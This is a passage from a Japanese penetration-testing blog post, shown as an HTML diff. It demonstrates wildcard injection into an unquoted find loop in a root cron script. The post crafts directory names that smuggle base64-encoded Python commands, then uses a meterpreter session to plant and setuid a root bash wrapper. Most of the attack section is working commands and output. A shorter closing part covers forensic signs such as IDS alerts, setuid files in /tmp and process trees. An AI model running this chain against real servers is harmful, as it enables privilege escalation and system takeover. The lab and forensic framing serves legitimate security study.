+        <span class="k">if</span> <span class="o">[</span> <span class="nv">$isProductDir</span> -eq <span class="m">1</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
+                bakDir <span class="nv">$dir</span>
+        <span class="k">fi</span>
+<span class="k">done</span>
+</code></pre></div><figure>
+    <img src="./bak_find.png"/> 
+</figure>
 
 <p>本スクリプトでは find が2箇所登場しています。</p>
 <p>まずは2つ目の find の対象パスに注目します。</p>
@@ -623,129 +513,105 @@ find コマンドには、-exec という便利なオプションがあります
 そしてその配下に 201903, 201904, 201905 ディレクトリを作成します。<br>
 （面白いのでぜひみんなも試してくれよな）
 <!-- raw HTML omitted --></p>
-<pre><code class="language-shell">$ mkdir /tmp/images/
-$ cd /tmp/images
-$ mkdir 201903 201904 201905
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">$ mkdir /tmp/images/
+$ <span class="nb">cd</span> /tmp/images
+$ mkdir <span class="m">201903</span> <span class="m">201904</span> 201905
 $ ls
-201903  201904  201905
+<span class="m">201903</span>  <span class="m">201904</span>  201905
 
-</code></pre>
-<!-- raw HTML omitted -->
-<pre><code class="language-shell">shu@kali:/tmp/images$ find *
+</code></pre></div><!-- raw HTML omitted -->
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ find *
 201903
 201904
 201905
 
-shu@kali:/tmp/images$ find * -exec echo &quot;Path:{}&quot; \;
+shu@kali:/tmp/images$ find * -exec <span class="nb">echo</span> <span class="s2">&#34;Path:{}&#34;</span> <span class="se">\;</span>
 Path:201903
 Path:201904
 Path:201905
-</code></pre>
-<p>※{}はマッチしたものが入る変数です。<br>
+</code></pre></div><p>※{}はマッチしたものが入る変数です。<br>
 ※「;」は-execの終了を示す記号です。<br>
 本当は「;」ですが、「;」はシェルでコマンドの区切りを示す特殊文字なのでエスケープしています。</p>
 <p>上記ではechoを使いましたが、別にどんなOSコマンドでも問題ないです。<br>
 {}を使う必要もなし。以下みたいに。</p>
-<pre><code class="language-shell">shu@kali:/tmp/images$ find * -exec uname \;
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ find * -exec uname <span class="se">\;</span>
 Linux
 Linux
 Linux
-</code></pre>
-<p>unameを使ってみました。3つのディレクトリが存在するので3回unameされてます。</p>
+</code></pre></div><p>unameを使ってみました。3つのディレクトリが存在するので3回unameされてます。</p>
 <p>当然touch コマンドとかもいいです。</p>
-<pre><code class="language-shell">shu@kali:/tmp/images$ find * -exec touch Test \;
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ find * -exec touch Test <span class="se">\;</span>
 shu@kali:/tmp/images$ ls -l
 total 12
-drwxr-xr-x 2 shu shu 4096 May 13 07:15 201903
-drwxr-xr-x 2 shu shu 4096 May 13 07:15 201904
-drwxr-xr-x 2 shu shu 4096 May 13 07:15 201905
--rw-r--r-- 1 shu shu    0 May 13 07:25 Test
-</code></pre>
-<p>findコマンドの仕組み上ディレクトリの数だけ同じコマンドが実行されるので、冪等性が保たれるようにしましょう。<br>
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:15 201903
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:15 201904
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:15 201905
+-rw-r--r-- <span class="m">1</span> shu shu    <span class="m">0</span> May <span class="m">13</span> 07:25 Test
+</code></pre></div><p>findコマンドの仕組み上ディレクトリの数だけ同じコマンドが実行されるので、冪等性が保たれるようにしましょう。<br>
 (状態をスイッチするコマンドとかは冪等性が保たれないのでここで使うのはよくない🙅)</p>
 <p>なお、findコマンドを実行したユーザの権限でOSコマンドが実行されます。</p>
 <!-- raw HTML omitted -->
 <p>次はこの-execの仕組みを利用して攻撃を試行します。</p>
 <h3 id="実験環境の作成">実験環境の作成</h3>
 <p>実験用にbakProductImage.shのfind部分を再現したシェルを作成し、vuln.shとして保存します。</p>
-<pre><code class="language-bash">#!/bin/bash
-image_dirs=` find /tmp/images -mindepth 1 -maxdepth 1 -name &quot;*&quot; -type d`
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
+</span><span class="cp"></span><span class="nv">image_dirs</span><span class="o">=</span><span class="sb">`</span> find /tmp/images -mindepth <span class="m">1</span> -maxdepth <span class="m">1</span> -name <span class="s2">&#34;*&#34;</span> -type d<span class="sb">`</span>
 
-for dir in $image_dirs; do
-	echo &quot;find $dir -maxdepth 1 -name 'goods_img' -type d &quot;
-	     find $dir -maxdepth 1 -name 'goods_img' -type d 
-	echo &quot;===&quot;
-done
-</code></pre>
-<!-- raw HTML omitted -->
-<pre><code class="language-shell">shu@kali:/tmp/images$ bash vuln.sh
-find /tmp/images/201904 -maxdepth 1 -name 'goods_img' -type d
-===
-find /tmp/images/201905 -maxdepth 1 -name 'goods_img' -type d
-===
-find /tmp/images/201903 -maxdepth 1 -name 'goods_img' -type d
-===
-</code></pre>
-<p>/tmp/imagesにあるディレクトリ3つに対してさらにfindが実行されました。<br>
+<span class="k">for</span> dir in <span class="nv">$image_dirs</span><span class="p">;</span> <span class="k">do</span>
+	<span class="nb">echo</span> <span class="s2">&#34;find </span><span class="nv">$dir</span><span class="s2"> -maxdepth 1 -name &#39;goods_img&#39; -type d &#34;</span>
+	     find <span class="nv">$dir</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d 
+	<span class="nb">echo</span> <span class="s2">&#34;===&#34;</span>
+<span class="k">done</span>
+</code></pre></div><!-- raw HTML omitted -->
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ bash vuln.sh
+find /tmp/images/201904 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
+<span class="o">===</span>
+find /tmp/images/201905 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
+<span class="o">===</span>
+find /tmp/images/201903 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
+<span class="o">===</span>
+</code></pre></div><p>/tmp/imagesにあるディレクトリ3つに対してさらにfindが実行されました。<br>
 echoだけがあって2つめのfindの結果が表示されないのは、各ディレクトリに&quot;goods_img&quot;が存在せず検索にマッチしなかったからです。</p>
 <p>試しに201903のディレクトリにgoods_imgディレクトリを作成します。</p>
-<pre><code class="language-shell">shu@kali:/tmp/images$ mkdir 201903/goods_img
-</code></pre>
-<!-- raw HTML omitted -->
-<pre><code class="language-shell">shu@kali:/tmp/images$ bash vuln.sh
-find /tmp/images/201904 -maxdepth 1 -name 'goods_img' -type d
-===
-find /tmp/images/201905 -maxdepth 1 -name 'goods_img' -type d
-===
-find /tmp/images/201903 -maxdepth 1 -name 'goods_img' -type d
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ mkdir 201903/goods_img
+</code></pre></div><!-- raw HTML omitted -->
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ bash vuln.sh
+find /tmp/images/201904 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
+<span class="o">===</span>
+find /tmp/images/201905 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type <span class="nv">d</span>
+<span class="o">===</span>
+find /tmp/images/201903 -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d
 /tmp/images/201903/goods_img
-===
-</code></pre>
-<p>201903ディレクトリだけ2つ目のfindでマッチ結果が実行されていますね。</p>
+<span class="o">===</span>
+</code></pre></div><p>201903ディレクトリだけ2つ目のfindでマッチ結果が実行されていますね。</p>
 <!-- raw HTML omitted -->
 <p>ディレクトリ名が $dir の形で 2つめのfindに渡されているということは、<br>
 ⚠️危険⚠️な名前のディレクトリを作成すれば任意のコマンドが実行できるということです。</p>
 <p>以下のようにディレクトリ名とは思えないディレクトリを作成します。</p>
-<pre><code class="language-shell">shu@kali:/tmp/images$ mkdir &quot;* -exec touch hack ;&quot;
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ mkdir <span class="s2">&#34;* -exec touch hack ;&#34;</span>
 shu@kali:/tmp/images$ ls -l
 total 20
-drwxr-xr-x 3 shu shu 4096 May 13 07:48  201903
-drwxr-xr-x 2 shu shu 4096 May 13 07:50  201904
-drwxr-xr-x 2 shu shu 4096 May 13 07:50  201905
-drwxr-xr-x 2 shu shu 4096 May 13 08:04 '* -exec touch hack ;'
--rw-r--r-- 1 shu shu  245 May 13 07:45  vuln.sh
-</code></pre>
-<p>「* -exec touch hack ;」という名前のディレクトリを作成しました。<br>
+drwxr-xr-x <span class="m">3</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:48  201903
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:50  201904
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 07:50  201905
+drwxr-xr-x <span class="m">2</span> shu shu <span class="m">4096</span> May <span class="m">13</span> 08:04 <span class="s1">&#39;* -exec touch hack ;&#39;</span>
+-rw-r--r-- <span class="m">1</span> shu shu  <span class="m">245</span> May <span class="m">13</span> 07:45  vuln.sh
+</code></pre></div><p>「* -exec touch hack ;」という名前のディレクトリを作成しました。<br>
 先程のfindの結果のとおりパスがマッチしないと-execが実行されないので最初に「*」を、<br>
 また -exec の終端を示すため末尾に「;」を付与しています。</p>
 <p>さて、この状態でもう一度vuln.shを実行します。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./find_test_injection.png" alt="./find_test_injection.png"/>
-    </div>
-    <a href="./find_test_injection.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./find_test_injection.png"/> 
+</figure>
 
 <p>エラーが大量に出ていますね。大量のエラーはインジェクション系攻撃の宿命です。</p>
 <p>危険なディレクトリを使ったfindはどうなっているでしょうか。下に抜粋します。</p>
-<pre><code class="language-bash">find /tmp/images/* -exec touch hack ; -maxdepth 1 -name 'goods_img' -type d
-</code></pre>
-<p>/tmp/images/* で引っかかったものに対して touch hack を行うという内容になっています。</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">find /tmp/images/* -exec touch hack <span class="p">;</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d
+</code></pre></div><p>/tmp/images/* で引っかかったものに対して touch hack を行うという内容になっています。</p>
 <p>ディレクトリの状態を見ます。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./find_test_injection_ls.png" alt="./find_test_injection_ls.png"/>
-    </div>
-    <a href="./find_test_injection_ls.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./find_test_injection_ls.png"/> 
+</figure>
 
 <p>hackファイルが作成されていますね。実験環境でWildcard Injectionが成功しました💪</p>
 <p>これをcronがroot権限でやってくれると権限昇格が捗りますね。　←ここ一番キモ</p>
@@ -761,32 +627,30 @@ drwxr-xr-x 2 shu shu 4096 May 13 08:04 '* -exec touch hack ;'
 これはforとfindの問題だと思いますが・・・。</li>
 </ul>
 <p>ただ、単一コマンドしか使えない場合でも、例えば bashなら bash -c を使ってワンライナーで複数コマンドを書くことができます。</p>
-<pre><code class="language-shell">shu@kali:/tmp/images$ bash -c &quot;echo aaa; echo bbb&quot;
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ bash -c <span class="s2">&#34;echo aaa; echo bbb&#34;</span>
 aaa
 bbb
-</code></pre>
-<p>しかしながら、今回のfor内のfindではスペースが使えません。<br>
+</code></pre></div><p>しかしながら、今回のfor内のfindではスペースが使えません。<br>
 実際に試してみます。</p>
-<pre><code class="language-shell">shu@kali:/tmp/images$ mkdir &quot;* -exec bash -c \&quot;touch aaa\&quot; ;&quot;
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ mkdir <span class="s2">&#34;* -exec bash -c \&#34;touch aaa\&#34; ;&#34;</span>
 shu@kali:/tmp/images$ bash vuln.sh
-(snip)
-===
-find /tmp/images/* -exec bash -c &quot;touch aaa&quot; ; -maxdepth 1 -name 'goods_img' -type d
-(snip)
-aaa&quot;: -c: line 0: unexpected EOF while looking for matching `&quot;'
-aaa&quot;: -c: line 1: syntax error: unexpected end of file
-(snip)
+<span class="o">(</span>snip<span class="o">)</span>
+<span class="o">===</span>
+find /tmp/images/* -exec bash -c <span class="s2">&#34;touch aaa&#34;</span> <span class="p">;</span> -maxdepth <span class="m">1</span> -name <span class="s1">&#39;goods_img&#39;</span> -type d
+<span class="o">(</span>snip<span class="o">)</span>
+aaa<span class="s2">&#34;: -c: line 0: unexpected EOF while looking for matching `&#34;</span><span class="s1">&#39;
+</span><span class="s1">aaa&#34;: -c: line 1: syntax error: unexpected end of file
+</span><span class="s1">(snip)
+</span><span class="s1">
+</span><span class="s1">shu@kali:/tmp/images$ ls -l
+</span><span class="s1">total 20
+</span><span class="s1">drwxr-xr-x 3 shu shu 4096 May 13 07:48  201903
+</span><span class="s1">drwxr-xr-x 2 shu shu 4096 May 13 07:50  201904
+</span><span class="s1">drwxr-xr-x 2 shu shu 4096 May 13 07:50  201905
+</span><span class="s1">drwxr-xr-x 2 shu shu 4096 May 13 08:34 &#39;</span>* -exec bash -c <span class="s2">&#34;touch aaa&#34;</span> <span class="p">;</span><span class="err">&#39;</span>
+-rw-r--r-- <span class="m">1</span> shu shu  <span class="m">245</span> May <span class="m">13</span> 07:45  vuln.sh
 
-shu@kali:/tmp/images$ ls -l
-total 20
-drwxr-xr-x 3 shu shu 4096 May 13 07:48  201903
-drwxr-xr-x 2 shu shu 4096 May 13 07:50  201904
-drwxr-xr-x 2 shu shu 4096 May 13 07:50  201905
-drwxr-xr-x 2 shu shu 4096 May 13 08:34 '* -exec bash -c &quot;touch aaa&quot; ;'
--rw-r--r-- 1 shu shu  245 May 13 07:45  vuln.sh
-
-</code></pre>
-<p>findでスペースの部分がEOF(EOL)として扱われるため、エラーがでてコマンドの実行に失敗してしまうのです。</p>
+</code></pre></div><p>findでスペースの部分がEOF(EOL)として扱われるため、エラーがでてコマンドの実行に失敗してしまうのです。</p>
 <h3 id="pythonによるワンライナー">Pythonによるワンライナー</h3>
 <p>このままでは単一コマンドしか使えないので、侵害には使いづらいです。<br>
 ただ、今回ECShopが稼働しているサーバにはPythonが入っていました。</p>
@@ -794,30 +658,20 @@ drwxr-xr-x 2 shu shu 4096 May 13 08:34 '* -exec bash -c &quot;touch aaa&quot; ;'
 スペースやスラッシュなんてbase64エンコードしてしまえばいいのです。</p>
 <p>ということで、できあがったものがこちらです。</p>
 <pre><code>mkdir &quot;* -exec python -c exec('[base64エンコードしたpythonコード]'.decode('base64')) ;&quot;
-</code></pre>
-<p>スペースもスラッシュも使いませんし、これで任意のpythonコードも、OSコマンドも実行できます。</p>
+</code></pre><p>スペースもスラッシュも使いませんし、これで任意のpythonコードも、OSコマンドも実行できます。</p>
 <!-- raw HTML omitted -->
 <h4 id="試しにディレクトリ作成">試しにディレクトリ作成</h4>
 <p>1度にtouchコマンドを2回使ってaaa、bbbディレクトリを作成してみます。</p>
 <p>os.systemを使えばOSコマンドが実行できます。</p>
 <pre><code>&gt;&gt;&gt; &quot;import os;os.system('touch aaa; touch bbb')&quot;.encode(&quot;base64&quot;)
 'aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ==\n'
-</code></pre>
-<p>⚠️危険⚠️なディレクトリを作成し、vuln.shを実行します。</p>
-<pre><code class="language-shell">shu@kali:/tmp/images$ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ=='.decode('base64')) ;&quot;
+</code></pre><p>⚠️危険⚠️なディレクトリを作成し、vuln.shを実行します。</p>
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">shu@kali:/tmp/images$ mkdir <span class="s2">&#34;* -exec python -c exec(&#39;aW1wb3J0IG9zO29zLnN5c3RlbSgndG91Y2ggYWFhOyB0b3VjaCBiYmInKQ==&#39;.decode(&#39;base64&#39;)) ;&#34;</span>
 shu@kali:/tmp/images$ bash vuln.sh
-(snip)
-</code></pre>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./find_test_python.png" alt="./find_test_python.png"/>
-    </div>
-    <a href="./find_test_python.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<span class="o">(</span>snip<span class="o">)</span>
+</code></pre></div><figure>
+    <img src="./find_test_python.png"/> 
+</figure>
 
 <p>ディレクトリが作成されていることがわかります。</p>
 <!-- raw HTML omitted -->
@@ -838,8 +692,7 @@ int main()
 	system(&quot;/bin/bash&quot;);
 	return 0;
 }
-</code></pre>
-<p>victimに送信し、コンパイルします。</p>
+</code></pre><p>victimに送信し、コンパイルします。</p>
 <pre><code>meterpreter &gt; upload bash_wrapper.c /tmp/.session
 [*] uploading  : bash_wrapper.c -&gt; /tmp/.session
 [*] uploaded   : bash_wrapper.c -&gt; /tmp/.session/bash_wrapper.c
@@ -851,8 +704,7 @@ gcc -o w ./bash_wrapper.c
 
 ls -l ./w
 -rwxr-xr-x 1 www-data www-data 6976 May 12 15:43 ./w
-</code></pre>
-<p>ラッパーが作成されました。</p>
+</code></pre><p>ラッパーが作成されました。</p>
 <h3 id="ラッパーの権限を操作するディレクトリを作成">ラッパーの権限を操作するディレクトリを作成</h3>
 <p>次に、ラッパーの所有者をrootにしてsuidを付与する⚠️危険⚠️なディレクトリを作成します。<br>
 作成先は、bakProductImage.sh のfind対象である /var/www/html/images 配下です。</p>
@@ -860,24 +712,15 @@ ls -l ./w
 「chown root /tmp/.session/w; chmod u+s /tmp/.session/w」というコマンドを実行するPythonコードをbase64エンコードします。</p>
 <pre><code>&gt;&gt;&gt; &quot;import os;os.system('chown root /tmp/.session/w; chmod u+s /tmp/.session/w')&quot;.encode(&quot;base64&quot;)
 'aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ==\n'
-</code></pre>
-<p>ディレクトリを作成します。</p>
+</code></pre><p>ディレクトリを作成します。</p>
 <pre><code>meterpreter &gt; shell
 Process 10076 created.
 Channel 17 created.
 
 mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAvdG1wLy5zZXNzaW9uL3c7IGNobW9kIHUr\ncyAvdG1wLy5zZXNzaW9uL3cnKQ=='.decode('base64')) ;&quot;
-</code></pre>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./escalation_images_dir.png" alt="./escalation_images_dir.png"/>
-    </div>
-    <a href="./escalation_images_dir.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+</code></pre><figure>
+    <img src="./escalation_images_dir.png"/> 
+</figure>
 
 <p>作成できました。</p>
 <p>なおfindに対してWildcard Injectionをするときは、コードが 255 文字を超えないように気をつけてください。<br>
@@ -887,30 +730,16 @@ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAv
 <hr>
 <h4 id="翌日1時">～翌日1時～</h4>
 <p>1時になったので、ラッパーファイルの状態を見てみます。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./escalation_success_dir.png" alt="./escalation_success_dir.png"/>
-    </div>
-    <a href="./escalation_success_dir.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./escalation_success_dir.png"/> 
+</figure>
 
 <p>見事ラッパーファイルの所有者がrootになってsuidがついていますね。
 更新日時も1時になっています。</p>
 <p>早速アクセスします。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./escalation_success_whoami.png" alt="./escalation_success_whoami.png"/>
-    </div>
-    <a href="./escalation_success_whoami.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./escalation_success_whoami.png"/> 
+</figure>
 
 <p>画像の通り root 権限になっています。</p>
 <p><strong>権限昇格成功です💪</strong></p>
@@ -928,16 +757,9 @@ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAv
 <p>WSOの各操作のレスポンスで検知しました。</p>
 <h4 id="et-policy-executable-and-linking-format-elf-file-download">ET POLICY Executable and linking format (ELF) file download</h4>
 <p>meterpreter にスイッチするためにmeterpreter stageをダウンロードするので、その時のバイナリを検知しました。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./ids_meterpreter_stager.png" alt="./ids_meterpreter_stager.png"/>
-    </div>
-    <a href="./ids_meterpreter_stager.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./ids_meterpreter_stager.png"/> 
+</figure>
 
 <!-- raw HTML omitted -->
 <h3 id="ファイルシステム">ファイルシステム</h3>
@@ -953,9 +775,8 @@ mkdir &quot;* -exec python -c exec('aW1wb3J0IG9zO29zLnN5c3RlbSgnY2hvd24gcm9vdCAv
 <p>侵害調査には 各tmpディレクトリを洗い出すのはもはや常識ですが、思わぬところに書き込み権限があり、攻撃者がそれを利用している可能性もあります。<br>
 なので /var/www/html など、tmpの他に侵害ユーザが書き込み可能なディレクトリも全て洗い出すべきですね。</p>
 <p>下記findコマンドでwww-dataが書き込み可能なディレクトリを調べられます。</p>
-<pre><code class="language-shell">find / \( -perm -002 -o -user www-data -o -group www-data \) -type d
-</code></pre>
-<!-- raw HTML omitted -->
+<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">find / <span class="se">\(</span> -perm -002 -o -user www-data -o -group www-data <span class="se">\)</span> -type d
+</code></pre></div><!-- raw HTML omitted -->
 <!-- raw HTML omitted -->
 <h4 id="tmpbc">/tmp/bc</h4>
 <p>WSO のリバースコネクト用バイナリ。<br>
@@ -965,16 +786,9 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
 <h4 id="tmpsessionw">/tmp/.session/w</h4>
 <p>権限昇格用バイナリ。suidがついているので大変わかりやすいです。</p>
 <p>find で suid が付与されているファイルを洗い出せば出てきます。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./forensics_find_suid.png" alt="./forensics_find_suid.png"/>
-    </div>
-    <a href="./forensics_find_suid.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./forensics_find_suid.png"/> 
+</figure>
 
 <p>一つだけ/tmpに存在するのでバレバレですね。<br>
 攻撃者は/usr/bin/ や /bin/ にファイルを作成できないのでこんなことになるのです。</p>
@@ -987,16 +801,9 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
 <h3 id="プロセス">プロセス</h3>
 <p>侵害調査時、万が一攻撃者が活動してて鉢合わせたらプロセスですぐにわかります。</p>
 <p>以下は「ps auxwf」の結果です。</p>
-
-
-<div class="box" >
-  <figure  itemprop="associatedMedia" itemscope itemtype="http://schema.org/ImageObject">
-    <div class="img">
-      <img itemprop="thumbnail" src="./forensics_ps.png" alt="./forensics_ps.png"/>
-    </div>
-    <a href="./forensics_ps.png" itemprop="contentUrl"></a>
-  </figure>
-</div>
+<figure>
+    <img src="./forensics_ps.png"/> 
+</figure>
 
 <p>以下の流れであることがひと目でわかりますね。</p>
 <ol>
@@ -1028,208 +835,123 @@ Cバイナリの場合は、常に/tmp/bc というパスでバイナリを作�
 <p>今回はAD侵害までいけず、Linux環境の権限昇格のところまででした。
 次こそADにいきたいですが、フォワーディングだけで終わりそう</p>
 <p>以上。</p>
-
-        
-          <div class="blog-tags">
-            
-              <a href="https://www.shutingrz.com//tags/pentest/">pentest</a>&nbsp;
-            
-              <a href="https://www.shutingrz.com//tags/priv_escalation/">priv_escalation</a>&nbsp;
-            
-              <a href="https://www.shutingrz.com//tags/ethical_hacking/">ethical_hacking</a>&nbsp;
-            
-          </div>
-        
-
-        
-            <hr/>
-            <section id="social-share">
-              <div class="list-inline footer-links">
+                    </div>
+                    
+                    
+                    <div class="after-post-tags">
+                        <ul class="tags">
+                        
+                        <li>
+                        <a href="/tags/pentest">pentest</a>
+                        </li>
+                        
+                        <li>
+                        <a href="/tags/priv_escalation">priv_escalation</a>
+                        </li>
+                        
+                        <li>
+                        <a href="/tags/ethical_hacking">ethical_hacking</a>
+                        </li>
+                        
+                        </ul>
+                    </div>
+                    
+                    
+                    
+                    <div class="row PageNavigation d-flex justify-content-between font-weight-bold">
+                    
+                        <a class="d-block col-md-6" href="https://www.shutingrz.com/post/can-training-first/"> &laquo; シミュレーション環境でCAN通信を試す</a>
+                    
+                    
+                        <a class="d-block col-md-6 text-lg-right" href="https://www.shutingrz.com/post/ad_hack-ec_exploit/">ペネトレ検証-ECサイトに侵入 &raquo;</a>
+                    
+                    <div class="clearfix"></div>
+                    </div>
+                    
+                </div>
                 
-
-<div class="share-box" aria-hidden="true">
-    <ul class="share">
-      
-      <li>
-        <a href="//twitter.com/share?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f&amp;text=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86&amp;via=shutingrz" target="_blank" title="Share on Twitter">
-          <i class="fab fa-twitter"></i>
-        </a>
-      </li>
-  
-      
-      <li>
-        <a href="//plus.google.com/share?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f" target="_blank" title="Share on Google Plus">
-          <i class="fab fa-google-plus"></i>
-        </a>
-      </li>
-  
-      
-      <li>
-        <a href="//www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f" target="_blank" title="Share on Facebook">
-          <i class="fab fa-facebook"></i>
-        </a>
-      </li>
-  
-      
-      <li>
-        <a href="//reddit.com/submit?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f&amp;title=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86" target="_blank" title="Share on Reddit">
-          <i class="fab fa-reddit"></i>
-        </a>
-      </li>
-  
-      
-      <li>
-        <a href="//www.linkedin.com/shareArticle?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f&amp;title=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86" target="_blank" title="Share on LinkedIn">
-          <i class="fab fa-linkedin"></i>
-        </a>
-      </li>
-  
-      
-      <li>
-        <a href="//www.stumbleupon.com/submit?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f&amp;title=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86" target="_blank" title="Share on StumbleUpon">
-          <i class="fab fa-stumbleupon"></i>
-        </a>
-      </li>
-  
-      
-      <li>
-        <a href="//www.pinterest.com/pin/create/button/?url=https%3a%2f%2fwww.shutingrz.com%2fpost%2fad_hack-linux_priv_escalation%2f&amp;description=%e3%83%9a%e3%83%8d%e3%83%88%e3%83%ac%e6%a4%9c%e8%a8%bc-%e6%a8%a9%e9%99%90%e6%98%87%e6%a0%bc%e3%81%a8Wildcard%20Injection%e3%81%ae%e5%8e%9f%e7%90%86" target="_blank" title="Share on Pinterest">
-          <i class="fab fa-pinterest"></i>
-        </a>
-      </li>
-    </ul>
-  </div>
-  
-              </div>
-            </section>
+            </div>
+        </div>
         
-
         
-          
-          
-          <h4 class="see-also">See also</h4>
-          <ul>
-          
-            <li><a href="/post/ad_hack-ec_exploit/">ペネトレ検証-ECサイトに侵入</a></li>
-          
-            <li><a href="/post/hugo-notice-banner/">記事に特定のタグがあったら「悪用禁止」と表示されるようにしてみた</a></li>
-          
-          </ul>
-          
-        
-      </article>
-
-      
